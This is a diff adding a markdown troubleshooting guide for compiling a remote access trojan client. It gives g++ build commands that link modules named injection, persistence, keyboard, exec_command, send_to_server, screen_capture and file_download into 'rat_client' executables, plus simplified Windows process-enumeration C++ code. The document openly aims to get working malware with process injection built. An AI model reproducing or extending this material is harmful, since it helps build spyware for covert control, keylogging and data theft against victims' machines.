@@ -1,0 +1,129 @@
+# FIXED COMPILATION COMMANDS FOR PROCESS INJECTION
+
+## PROBLEMS FIXED:
+1. Added `#define _WIN32_WINNT 0x0600` to process_utils.cpp
+2. Added `#define WIN32_LEAN_AND_MEAN` to process_utils.cpp
+3. These defines must come BEFORE #include <windows.h>
+
+## CORRECT COMPILATION COMMAND (PowerShell):
+
+```powershell
+cd "C:\Users\Administrator\Desktop\CLI C+ Root\rootserver"
+g++ -o rat_client_enhanced.exe main.cpp process_utils.cpp injection.cpp persistence.cpp utils.cpp keyboard.cpp exec_command.cpp send_to_server.cpp screen_capture.cpp send_file.cpp file_download.cpp -lpsapi -ladvapi32 -luser32 -lws2_32 -lgdi32 -static -std=c++11 -D_WIN32_WINNT=0x0600
+```
+
+## SIMPLIFIED VERSION (Test if it works):
+
+```powershell
+cd "C:\Users\Administrator\Desktop\CLI C+ Root\rootserver"
+g++ -c process_utils.cpp -o process_utils.o -D_WIN32_WINNT=0x0600
+g++ -o test.exe main.cpp process_utils.o -lpsapi -ladvapi32 -lws2_32 -D_WIN32_WINNT=0x0600
+```
+
+## STEP-BY-STEP FIX:
+
+### 1. First, test process_utils.cpp alone:
+```powershell
+cd "C:\Users\Administrator\Desktop\CLI C+ Root\rootserver"
+g++ -c process_utils.cpp -o process_utils_test.o -D_WIN32_WINNT=0x0600
+echo "If no errors, compilation succeeded!"
+```
+
+### 2. If still errors, use this SIMPLIFIED process_utils.cpp:
+
+Create a new file `process_utils_simple.cpp` with just basic functionality:
+
+```cpp
+#define _WIN32_WINNT 0x0600
+#define WIN32_LEAN_AND_MEAN
+#include <windows.h>
+#include <tlhelp32.h>
+#include <string>
+#include <vector>
+#include <sstream>
+
+struct ProcessInfo {
+    DWORD pid;
+    std::string name;
+    DWORD sessionId;
+    SIZE_T memoryUsage;
+    DWORD threadCount;
+    DWORD parentPid;
+    std::string architecture;
+    std::string user;
+    std::string path;
+};
+
+std::vector<ProcessInfo> GetProcessList() {
+    std::vector<ProcessInfo> processes;
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE) return processes;
+    
+    PROCESSENTRY32 pe32;
+    pe32.dwSize = sizeof(PROCESSENTRY32);
+    
+    if (!Process32First(hSnapshot, &pe32)) {
+        CloseHandle(hSnapshot);
+        return processes;
+    }
+    
+    do {
+        ProcessInfo info;
+        info.pid = pe32.th32ProcessID;
+        info.name = pe32.szExeFile;
+        info.parentPid = pe32.th32ParentProcessID;
+        info.threadCount = pe32.cntThreads;
+        info.sessionId = 0;
+        info.memoryUsage = 0;
+        info.architecture = "Unknown";
+        info.user = "Unknown";
+        info.path = "";
+        
+        processes.push_back(info);
+    } while (Process32Next(hSnapshot, &pe32));
+    
+    CloseHandle(hSnapshot);
+    return processes;
+}
+
+std::string GetProcessListJSON() {
+    auto processes = GetProcessList();
+    std::ostringstream json;
+    json << "[";
+    bool first = true;
+    
+    for (const auto& proc : processes) {
+        if (!first) json << ",";
+        first = false;
+        json << "{\"pid\":" << proc.pid << ",\"name\":\"" << proc.name << "\"}";
+    }
+    
+    json << "]";
+    return json.str();
+}
+```
+
+### 3. Compile with simplified version:
+```powershell
+cd "C:\Users\Administrator\Desktop\CLI C+ Root\rootserver"
+g++ -c process_utils_simple.cpp -o process_utils.o -D_WIN32_WINNT=0x0600
+g++ -o rat_client_simple.exe main.cpp process_utils.o injection.o persistence.o utils.o keyboard.o exec_command.o send_to_server.o screen_capture.o send_file.o file_download.o -lpsapi -ladvapi32 -luser32 -lws2_32 -lgdi32 -static -std=c++11
+```
+
+## ALTERNATIVE: USE COMPILE.BAT
+
+Check if compile.bat exists and run it:
+```powershell
+cd "C:\Users\Administrator\Desktop\CLI C+ Root\rootserver"
+.\compile.bat
+```
+
+## IF ALL ELSE FAILS:
+
+Compile without process_utils.cpp first to test other files:
+```powershell
+cd "C:\Users\Administrator\Desktop\CLI C+ Root\rootserver"
+g++ -o rat_client_no_process.exe main.cpp injection.cpp persistence.cpp utils.cpp keyboard.cpp exec_command.cpp send_to_server.cpp screen_capture.cpp send_file.cpp file_download.cpp -lpsapi -ladvapi32 -luser32 -lws2_32 -lgdi32 -static -std=c++11
+```
+
+This will create a RAT client without the new process injection features, but at least it will compile.
